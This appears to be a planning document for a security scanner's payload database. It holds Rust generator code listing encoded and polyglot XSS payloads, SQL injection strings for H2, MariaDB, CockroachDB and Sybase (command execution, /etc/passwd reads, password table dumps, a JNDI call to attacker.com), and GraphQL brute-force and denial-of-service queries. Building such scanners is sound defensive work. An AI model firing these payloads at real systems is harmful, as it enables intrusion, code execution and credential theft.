# Phase 1: Payload Foundation - Research

**Researched:** 2026-01-30
**Domain:** Security payload database (XSS encoding, polyglots, database-specific SQLi, GraphQL injection)
**Confidence:** HIGH

## Summary

This research investigates the specific payload requirements for v3.10 detection capabilities. The phase involves adding encoding variations for XSS (hex, octal, Unicode, UTF-7), polyglot XSS payloads, database-specific SQLi payloads for H2, MariaDB, CockroachDB, and Sybase, and GraphQL injection payloads.

The existing codebase already has a comprehensive payload architecture in `src/payloads.rs`, `src/payloads_comprehensive.rs`, and `src/payloads_optimized.rs`. The current structure uses static arrays with lazy initialization via `OnceLock`, deduplication via `AHashSet`, and zero-copy sharing via `Arc<str>`. The architecture supports mode-based filtering (fast, normal, thorough, comprehensive).

**Primary recommendation:** Extend the existing payload generator functions with the new encoding variations and database-specific payloads. Add new generator functions following the established pattern (e.g., `generate_encoding_bypass_xss()` extension, `generate_h2_specific_sqli()`, etc.) and wire them into the main `get_all_xss_payloads()` and `get_all_sqli_payloads()` aggregators.

## Standard Stack

The established libraries/tools for this domain:

### Core
| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| Rust std | 1.70+ | Core language | Already in use |
| ahash | 0.8+ | Fast hashing for deduplication | Already in use, faster than std HashMap |
| Arc<str> | std | Zero-copy payload sharing | Already in use, memory efficient |
| OnceLock | std | Thread-safe lazy initialization | Already in use, replaces lazy_static |

### Supporting
| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| hex | 0.4+ | Hex encoding utilities | For generating hex payloads |
| base64 | 0.21+ | Base64 encoding | For encoded payloads |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| Static generation | Runtime generation | Static is faster at runtime, runtime allows dynamic customization |
| Vec<String> | Vec<Arc<str>> | Arc<str> better for concurrent access, already in use |

## Architecture Patterns

### Existing Project Structure
```
src/
├── payloads.rs                # Entry point, re-exports from comprehensive
├── payloads_comprehensive.rs  # All payload generators (100K+ XSS, 75K+ SQLi)
├── payloads_optimized.rs      # Lazy loading, deduplication, Arc<str> caching
└── inference/
    └── signals.rs             # Error pattern detection for databases
```

### Pattern 1: Payload Generator Function
**What:** Pure function that returns a Vec<String> of payloads for a specific category
**When to use:** Adding new payload categories
**Example:**
```rust
// Source: Existing codebase pattern from payloads_comprehensive.rs
/// Generate [category]-specific payloads (N+)
pub fn generate_[category]_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Category-specific variations
    payloads.extend(vec![
        "payload1".to_string(),
        "payload2".to_string(),
    ]);

    // Programmatic generation for combinations
    for prefix in &prefixes {
        for suffix in &suffixes {
            payloads.push(format!("{}{}", prefix, suffix));
        }
    }

    payloads
}
```

### Pattern 2: Aggregator Function
**What:** Combines multiple generator outputs into a unified payload set
**When to use:** Main entry point functions like `get_all_xss_payloads()`
**Example:**
```rust
// Source: payloads_comprehensive.rs lines 1027-1045
pub fn get_all_xss_payloads() -> Vec<String> {
    let mut all_payloads = Vec::new();

    all_payloads.extend(generate_script_variations());
    all_payloads.extend(generate_event_variations());
    all_payloads.extend(generate_encoding_variations()); // Add new generators here
    // ... etc

    all_payloads
}
```

### Pattern 3: Mode-Based Filtering
**What:** Sample payloads based on scan mode (fast/normal/thorough/comprehensive)
**When to use:** Already implemented, automatically applies to new payloads
**Example:**
```rust
// Source: payloads_comprehensive.rs lines 1720-1745
pub fn filter_by_mode(payloads: &[String], mode: &str) -> Vec<String> {
    let sample_rate = match mode {
        "fast" => 0.005,        // 0.5%
        "normal" => 0.01,       // 1%
        "thorough" => 0.02,     // 2%
        "comprehensive" => 1.0, // 100%
        _ => 0.01,
    };
    // Evenly distributed sampling
}
```

### Anti-Patterns to Avoid
- **Hand-rolling encoding:** Use format! with hex/octal escapes, don't manually build character codes
- **Duplicate payloads:** The deduplication layer handles this, but avoid obvious duplicates in generators
- **Blocking initialization:** Use OnceLock for lazy init, never block on payload loading

## Don't Hand-Roll

Problems that look simple but have existing solutions:

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Hex encoding | Manual char code conversion | Rust format! with `\x{:02x}` | Correct escaping, readable |
| Payload deduplication | Custom HashSet | Existing `deduplicate_and_intern()` | Already handles Arc<str> |
| Thread-safe caching | Manual Mutex | OnceLock pattern in payloads_optimized.rs | Already implemented |
| Encoding variations | Copy-paste payloads | Generate programmatically | Covers edge cases, maintainable |

**Key insight:** The payload system already has excellent architecture. Focus on adding content to existing patterns, not changing structure.

## Common Pitfalls

### Pitfall 1: Missing Context Awareness
**What goes wrong:** Payloads work in one context but not others (e.g., attribute vs script)
**Why it happens:** XSS requires different escaping in different HTML contexts
**How to avoid:** Include payloads for each context (HTML body, attribute, JS string, URL)
**Warning signs:** Payload only has one quote style, no context breakouts

### Pitfall 2: Incomplete Encoding Coverage
**What goes wrong:** WAFs block standard encodings, miss edge cases
**Why it happens:** Only adding obvious encodings like `%3C` for `<`
**How to avoid:** Include multi-byte UTF-8, overlong sequences, mixed encodings
**Warning signs:** All payloads use same encoding scheme

### Pitfall 3: Database Version Blindness
**What goes wrong:** Payloads fail on newer/older database versions
**Why it happens:** SQL syntax varies across versions
**How to avoid:** Test payloads on multiple versions, use conditional comments
**Warning signs:** Payloads only work on one specific version

### Pitfall 4: GraphQL Schema Assumptions
**What goes wrong:** Injection payloads assume specific field names
**Why it happens:** GraphQL schemas vary per application
**How to avoid:** Use generic field names, rely on introspection results
**Warning signs:** Hardcoded field names like "users" or "password"

## Code Examples

### XSS Hex/Octal/Unicode Encoding (PAY-01)

```rust
// Source: PayloadsAllTheThings, PortSwigger research
/// Generate XSS payloads with various encoding schemes
pub fn generate_xss_encoding_variations() -> Vec<String> {
    let mut payloads = Vec::new();

    // Hex encoding (\xNN format in JavaScript)
    payloads.extend(vec![
        r#"<script>\x61\x6c\x65\x72\x74(1)</script>"#.to_string(),  // alert
        r#"<img src=x onerror=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
        r#"<svg onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
    ]);

    // Octal encoding (\NNN format)
    payloads.extend(vec![
        r#"<script>\141\154\145\162\164(1)</script>"#.to_string(),  // alert in octal
        r#"javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'"#.to_string(),
    ]);

    // Unicode escapes (\uNNNN format)
    payloads.extend(vec![
        r#"<script>\u0061\u006c\u0065\u0072\u0074(1)</script>"#.to_string(),
        r#"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
        // Full-width Unicode bypass
        r#"<\uFF1Cscript\uFF1E>alert(1)</script>"#.to_string(),
    ]);

    // UTF-7 encoding (for legacy charset attacks)
    payloads.extend(vec![
        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
        "+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-".to_string(),
    ]);

    // UTF-8 overlong sequences (WAF bypass)
    payloads.extend(vec![
        "<%C0%BCscript>alert(1)</script>".to_string(),  // < as overlong UTF-8
        "<%E0%80%BCscript>alert(1)</script>".to_string(),
        "<%F0%80%80%BCscript>alert(1)</script>".to_string(),
    ]);

    // Mixed/nested encodings
    payloads.extend(vec![
        r#"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"#.to_string(),
        "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),  // Double URL encode
    ]);

    payloads
}
```

### Polyglot XSS Payloads (PAY-02)

```rust
// Source: PayloadsAllTheThings Polyglot, Gareth Heyes, 0xsobky
/// Generate polyglot XSS payloads that work in multiple contexts
pub fn generate_polyglot_xss_payloads() -> Vec<String> {
    vec![
        // 0xsobky Ultimate Polyglot - works in: JS, HTML event, SVG, URL
        r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#.to_string(),

        // Mathias Karlsson Polyglot - attribute/event/comment contexts
        r#"" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//"#.to_string(),

        // Multi-context string polyglot - single/double quote JS strings
        r#"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"#.to_string(),

        // HTML/JS/URL polyglot
        r#"JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript/--!><sVg/oNloAd=alert()//>%0D%0A"#.to_string(),

        // Comment breakout polyglot
        r#"-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>"#.to_string(),

        // Tag/attribute breakout polyglot
        r#"'>"><img src=x onerror=alert()><"#.to_string(),

        // Template literal polyglot (ES6)
        r#"`${alert(1)}`"#.to_string(),
        r#"${7*7}"#.to_string(),  // Template injection test

        // Mutation XSS polyglot
        r#"<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>"#.to_string(),
    ]
}
```

### H2 Database SQLi Payloads (PAY-03 - H2)

```rust
// Source: dotCMS RCE research, JFrog JNDI research, H2 documentation
/// Generate H2 Database-specific SQL injection payloads
pub fn generate_h2_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // H2 version detection
    payloads.extend(vec![
        "' UNION SELECT H2VERSION()--".to_string(),
        "' UNION SELECT NULL,H2VERSION()--".to_string(),
    ]);

    // H2 CREATE ALIAS RCE (most critical H2-specific vector)
    payloads.extend(vec![
        "'; CREATE ALIAS EXEC AS $$ void e(String cmd) throws java.io.IOException {java.lang.Runtime.getRuntime().exec(cmd);}$$--".to_string(),
        "'; CALL EXEC('whoami')--".to_string(),
        // Using HEXTORAW to bypass filters
        "'; CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException', HEXTORAW('007b'), 'java.lang.Runtime.getRuntime().exec(cmd);', HEXTORAW('007d'))--".to_string(),
    ]);

    // H2 file read via CSVREAD
    payloads.extend(vec![
        "' UNION SELECT * FROM CSVREAD('/etc/passwd')--".to_string(),
        "' UNION SELECT * FROM CSVREAD('C:/windows/win.ini')--".to_string(),
    ]);

    // H2 file write
    payloads.extend(vec![
        "'; CALL CSVWRITE('/tmp/test.txt', 'SELECT 1')--".to_string(),
    ]);

    // H2 LINK_SCHEMA JNDI injection (CVE-2021-42392 related)
    payloads.extend(vec![
        "'; SELECT * FROM LINK_SCHEMA('pwnfr0g', 'javax.naming.InitialContext', 'ldap://attacker.com:1389/Exploit', 'pwnfr0g', 'pwnfr0g', 'PUBLIC')--".to_string(),
    ]);

    // H2 time-based blind
    payloads.extend(vec![
        "' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--".to_string(),
    ]);

    // H2 error-based
    payloads.extend(vec![
        "' AND 1=CAST(H2VERSION() AS INT)--".to_string(),
    ]);

    payloads
}
```

### MariaDB-Specific SQLi Payloads (PAY-03 - MariaDB)

```rust
// Source: PayloadsAllTheThings MySQL, pentestmonkey, MariaDB docs
/// Generate MariaDB-specific SQL injection payloads
pub fn generate_mariadb_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // MariaDB version detection (distinct from MySQL)
    payloads.extend(vec![
        "' UNION SELECT @@version--".to_string(),  // Shows "10.x.x-MariaDB"
        "' UNION SELECT VERSION()--".to_string(),
        "' AND (SELECT @@version) LIKE '%MariaDB%'--".to_string(),
    ]);

    // MariaDB-specific functions
    payloads.extend(vec![
        "' UNION SELECT UUID_SHORT()--".to_string(),
        "' UNION SELECT JSON_QUERY('{}', '$')--".to_string(),  // MariaDB 10.2.3+
        "' UNION SELECT COLUMN_JSON(COLUMN_CREATE('a', 1))--".to_string(),  // Dynamic columns
    ]);

    // MariaDB CONNECT storage engine (file read)
    payloads.extend(vec![
        "'; CREATE TABLE t1 ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd'--".to_string(),
    ]);

    // MariaDB sequence exploitation
    payloads.extend(vec![
        "' UNION SELECT NEXTVAL(seq)--".to_string(),  // Sequences (10.3+)
    ]);

    // Version-conditional execution (/*!NNNNN */)
    payloads.extend(vec![
        "' /*!100300 UNION SELECT password FROM users*/--".to_string(),  // Execute on 10.3.0+
        "' /*!50000 UNION*/ SELECT 1,2,3--".to_string(),
    ]);

    // MariaDB system tables
    payloads.extend(vec![
        "' UNION SELECT user FROM mysql.user--".to_string(),
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--".to_string(),
    ]);

    // Time-based (same as MySQL)
    payloads.extend(vec![
        "' AND SLEEP(5)--".to_string(),
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".to_string(),
    ]);

    payloads
}
```

### CockroachDB-Specific SQLi Payloads (PAY-03 - CockroachDB)

```rust
// Source: CockroachDB docs (PostgreSQL wire protocol compatible)
/// Generate CockroachDB-specific SQL injection payloads
/// Note: CockroachDB uses PostgreSQL wire protocol, so most PG payloads work
pub fn generate_cockroachdb_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // CockroachDB version detection
    payloads.extend(vec![
        "' UNION SELECT version()--".to_string(),  // Shows "CockroachDB CCL vXX.X.X"
        "' UNION SELECT crdb_internal.node_id()--".to_string(),
        "' AND version() LIKE '%CockroachDB%'--".to_string(),
    ]);

    // CockroachDB internal tables (unique to CRDB)
    payloads.extend(vec![
        "' UNION SELECT * FROM crdb_internal.tables--".to_string(),
        "' UNION SELECT * FROM crdb_internal.zones--".to_string(),
        "' UNION SELECT * FROM crdb_internal.cluster_settings--".to_string(),
        "' UNION SELECT * FROM crdb_internal.node_statement_statistics--".to_string(),
    ]);

    // CockroachDB specific functions
    payloads.extend(vec![
        "' UNION SELECT crdb_internal.cluster_id()--".to_string(),
        "' UNION SELECT crdb_internal.force_error('test', 'error')--".to_string(),
        "' UNION SELECT gen_random_uuid()--".to_string(),
    ]);

    // PostgreSQL-compatible payloads (work on CockroachDB)
    payloads.extend(vec![
        "' UNION SELECT current_database()--".to_string(),
        "' UNION SELECT current_user--".to_string(),
        "' AND pg_sleep(5)--".to_string(),  // Time-based (if enabled)
        "' UNION SELECT table_name FROM information_schema.tables--".to_string(),
    ]);

    // CockroachDB EXPLAIN for info disclosure
    payloads.extend(vec![
        "'; EXPLAIN SELECT * FROM users--".to_string(),
        "'; EXPLAIN ANALYZE SELECT * FROM users--".to_string(),
    ]);

    payloads
}
```

### Sybase ASE-Specific SQLi Payloads (PAY-03 - Sybase)

```rust
// Source: Database Hacker's Handbook, Invicti cheatsheet, Steemit research
/// Generate Sybase ASE-specific SQL injection payloads
pub fn generate_sybase_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // Sybase version detection
    payloads.extend(vec![
        "' AND 1=convert(numeric,(SELECT @@version))--".to_string(),  // Error-based version leak
        "' UNION SELECT @@version--".to_string(),
    ]);

    // Sybase system tables
    payloads.extend(vec![
        "' UNION SELECT name FROM master..sysdatabases--".to_string(),
        "' UNION SELECT name FROM sysobjects WHERE type='U'--".to_string(),
        "' UNION SELECT name FROM syscolumns--".to_string(),
        "' UNION SELECT suser_name()--".to_string(),
    ]);

    // Sybase comment styles (same as MSSQL)
    payloads.extend(vec![
        "' OR 1=1--".to_string(),
        "' OR 1=1/*".to_string(),
    ]);

    // Sybase stacking (supported)
    payloads.extend(vec![
        "'; SELECT @@servername--".to_string(),
        "'; SELECT db_name()--".to_string(),
        "'; EXEC xp_cmdshell 'whoami'--".to_string(),  // If enabled
    ]);

    // Sybase case-sensitive bypass (system tables are lowercase)
    payloads.extend(vec![
        // Using variables to bypass uppercase filter
        "'; BEGIN DECLARE @t VARCHAR(128) SELECT @t=LOWER('SYSOBJECTS') EXEC('SELECT * FROM '+@t) END--".to_string(),
    ]);

    // Sybase time-based blind
    payloads.extend(vec![
        "'; WAITFOR DELAY '0:0:5'--".to_string(),
        "' AND (CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE 0 END)--".to_string(),
    ]);

    // Sybase error-based (integer conversion)
    payloads.extend(vec![
        "' AND 1=convert(int,(SELECT TOP 1 name FROM sysobjects))--".to_string(),
        "' AND 1=convert(int,(SELECT user_name()))--".to_string(),
    ]);

    // Sybase login info extraction
    payloads.extend(vec![
        "' UNION SELECT name,password FROM master..syslogins--".to_string(),
    ]);

    payloads
}
```

### GraphQL Injection Payloads (PAY-04)

```rust
// Source: PayloadsAllTheThings GraphQL, OWASP GraphQL Cheat Sheet, HackTricks
/// Generate comprehensive GraphQL injection payloads
pub fn generate_graphql_injection_payloads() -> Vec<String> {
    let mut payloads = Vec::new();

    // Introspection queries (schema discovery)
    payloads.extend(vec![
        // Full schema introspection
        r#"{"query":"{__schema{queryType{name}mutationType{name}types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name}}},type{kind,name,ofType{kind,name}}}}}}"}"#.to_string(),
        // Simplified introspection
        r#"{"query":"{__schema{types{name,fields{name}}}}"}"#.to_string(),
        // Query type discovery
        r#"{"query":"{__type(name:\"Query\"){name,fields{name,args{name,type{name}}}}}"}"#.to_string(),
        // Mutation discovery
        r#"{"query":"{__type(name:\"Mutation\"){name,fields{name}}}"}"#.to_string(),
    ]);

    // Batching attacks (rate limit bypass)
    payloads.extend(vec![
        // JSON array batching
        r#"[{"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"pass2\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"pass3\"){token}}"}]"#.to_string(),
        // Alias-based batching (single request, multiple operations)
        r#"{"query":"mutation{a:login(user:\"admin\",pass:\"123\"){token}b:login(user:\"admin\",pass:\"456\"){token}c:login(user:\"admin\",pass:\"789\"){token}}"}"#.to_string(),
    ]);

    // Deeply nested queries (DoS/complexity attack)
    payloads.extend(vec![
        r#"{"query":"{user{friends{friends{friends{friends{friends{friends{friends{friends{id}}}}}}}}}"}"#.to_string(),
        r#"{"query":"{__type(name:\"Query\"){fields{type{fields{type{fields{type{fields{name}}}}}}}}}"}"#.to_string(),
    ]);

    // SQL injection through GraphQL arguments
    payloads.extend(vec![
        r#"{"query":"{user(id:\"1' OR '1'='1\"){id,email}}"}"#.to_string(),
        r#"{"query":"{user(id:\"1 UNION SELECT NULL,password FROM users--\"){id}}"}"#.to_string(),
        r#"{"query":"{user(where:{id:{_eq:\"1' OR '1'='1\"}}){id}}"}"#.to_string(),  // Hasura-style
    ]);

    // NoSQL injection through GraphQL
    payloads.extend(vec![
        r#"{"query":"{user(filter:\"{\\\"$ne\\\":null}\"){id}}"}"#.to_string(),
        r#"{"query":"{users(search:\"{\\\"username\\\":{\\\"$regex\\\":\\\".*\\\"}}\"){id,username}}"}"#.to_string(),
    ]);

    // Field/directive overloading (resource exhaustion)
    payloads.extend(vec![
        r#"{"query":"{user{id id id id id id id id id id name name name name}}"}"#.to_string(),
        r#"{"query":"query{users @skip(if:false) @skip(if:false) @skip(if:false){id}}"}"#.to_string(),
    ]);

    // Authorization bypass attempts
    payloads.extend(vec![
        r#"{"query":"mutation{updateUser(id:1,role:\"admin\"){id,role}}"}"#.to_string(),
        r#"{"query":"mutation{deleteUser(id:1){success}}"}"#.to_string(),
        r#"{"query":"{user(id:1){password,secretKey}}"}"#.to_string(),  // Sensitive field access
    ]);

    // Fragment-based attacks
    payloads.extend(vec![
        r#"{"query":"query{...F}fragment F on Query{user{id}}fragment F on Query{admin{password}}"}"#.to_string(),
    ]);

    // Subscription abuse (if supported)
    payloads.extend(vec![
        r#"{"query":"subscription{userCreated{id,email,password}}"}"#.to_string(),
    ]);

    payloads
}
```

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Basic `<script>alert(1)` | Polyglot multi-context | 2018+ | Single payload tests all contexts |
| URL encoding only | Multi-layer encoding (hex/octal/unicode) | 2020+ | Bypasses modern WAFs |
| Generic SQLi | Database-fingerprint then targeted | 2022+ | Higher success rate, lower noise |
| REST-style GraphQL | Batching/alias exploitation | 2023+ | Rate limit bypass, brute force |

**Deprecated/outdated:**
- UTF-7 XSS: Only works on legacy systems with charset sniffing, but still valuable for coverage
- MSSQL xp_cmdshell: Often disabled, but still worth including
- Simple `' OR 1=1` payloads: Still work but insufficient alone

## Open Questions

Things that couldn't be fully resolved:

1. **CockroachDB-specific time-based blind**
   - What we know: CockroachDB uses PostgreSQL wire protocol
   - What's unclear: Whether `pg_sleep()` is enabled by default in CRDB
   - Recommendation: Include both PostgreSQL payloads and CRDB-specific alternatives

2. **UTF-7 browser support**
   - What we know: Modern browsers don't auto-detect UTF-7
   - What's unclear: Edge cases with Content-Type manipulation
   - Recommendation: Include UTF-7 payloads but mark as legacy/edge-case

## Sources

### Primary (HIGH confidence)
- PayloadsAllTheThings XSS Filter Bypass - https://swisskyrepo.github.io/PayloadsAllTheThings/XSS%20Injection/
- PayloadsAllTheThings GraphQL Injection - https://swisskyrepo.github.io/PayloadsAllTheThings/GraphQL%20Injection/
- PayloadsAllTheThings MySQL Injection - https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection.md
- PortSwigger XSS Cheat Sheet 2025 - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger Encoding Obfuscation - https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings
- OWASP XSS Filter Evasion - https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- OWASP GraphQL Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html

### Secondary (MEDIUM confidence)
- dotCMS H2 SQLi to RCE - https://www.sonarsource.com/blog/dotcms515-sqli-to-rce/
- JFrog H2 JNDI Vulnerability - https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/
- Database Hacker's Handbook (Sybase chapter) - https://www.oreilly.com/library/view/the-database-hackers/9780764578014/ch014-sec008.html
- CockroachDB SQL Feature Support - https://www.cockroachlabs.com/docs/stable/sql-feature-support

### Tertiary (LOW confidence)
- Various Medium articles on SQLi payloads (verified patterns against official sources)

## Metadata

**Confidence breakdown:**
- XSS encoding payloads: HIGH - Verified against PortSwigger and PayloadsAllTheThings
- Polyglot payloads: HIGH - Well-documented, sourced from Gareth Heyes and community research
- H2 SQLi: HIGH - Verified against CVE research and official H2 docs
- MariaDB SQLi: HIGH - Extension of verified MySQL techniques
- CockroachDB SQLi: MEDIUM - PostgreSQL-based but CRDB-specific functions need validation
- Sybase SQLi: MEDIUM - Older documentation, some techniques may vary by version
- GraphQL injection: HIGH - OWASP and PayloadsAllTheThings comprehensive coverage

**Research date:** 2026-01-30
**Valid until:** 2026-03-30 (60 days - stable domain, infrequent changes to encoding techniques)
